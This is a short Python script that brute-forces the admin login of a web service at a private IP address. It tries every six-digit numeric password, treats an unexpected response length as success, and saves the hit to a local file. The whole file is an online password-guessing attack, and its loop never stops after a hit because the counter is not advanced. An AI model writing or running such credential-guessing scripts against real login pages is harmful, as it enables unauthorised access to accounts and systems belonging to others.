import requests
import re


def password(a):
    if a < 1000000:
        return a + 1
    else:
        return 'null'


a = 000000
while a != 'null':
    a = str(a)
    a = a.zfill(6)
    print(a)
    r = requests.post('http://192.168.3.3/',
                      data={'action': 'login', 'login_username': 'admin', 'login_password': a})
    r = str(r.content)
    size = len(r)
    print(size)
    a = str(a)
    if size != 2057:
        f = open('D:/1.txt', 'w')
        f.write(a)
        f.close()
    else:
        a = int(a)
        a = password(a)


r1 = requests.get('http://192.168.3.3/')
r1 = str(r1.content)
size1 = len(r1)
print('hahaahahahaha')
